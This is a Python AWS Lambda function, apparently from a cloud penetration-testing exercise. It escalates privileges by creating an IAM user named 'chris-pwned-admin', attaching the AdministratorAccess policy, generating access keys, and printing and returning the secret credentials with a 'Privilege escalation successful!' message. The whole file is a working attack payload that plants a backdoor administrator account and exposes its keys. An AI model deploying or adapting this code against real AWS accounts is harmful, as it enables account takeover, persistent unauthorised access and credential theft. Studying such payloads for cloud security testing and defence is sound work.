import boto3
import json

def lambda_handler(event, context):
    iam = boto3.client('iam')
    
    try:
        # Create a new admin user
        print("Creating admin user...")
        user_response = iam.create_user(UserName='chris-pwned-admin')
        
        # Attach AdministratorAccess policy
        print("Attaching AdministratorAccess policy...")
        iam.attach_user_policy(
            UserName='chris-pwned-admin',
            PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
        )
        
        # Create access keys for the new admin user
        print("Creating access keys...")
        key_response = iam.create_access_key(UserName='chris-pwned-admin')
        
        credentials = {
            'AccessKeyId': key_response['AccessKey']['AccessKeyId'],
            'SecretAccessKey': key_response['AccessKey']['SecretAccessKey']
        }
        
        print(f"SUCCESS! Admin credentials: {credentials}")
        
        return {
            'statusCode': 200,
            'body': json.dumps({
                'message': 'Privilege escalation successful!',
                'username': 'chris-pwned-admin',
                'credentials': credentials
            })
        }
        
    except Exception as e:
        print(f"Error: {str(e)}")
        return {
            'statusCode': 500,
            'body': json.dumps({'error': str(e)})
        }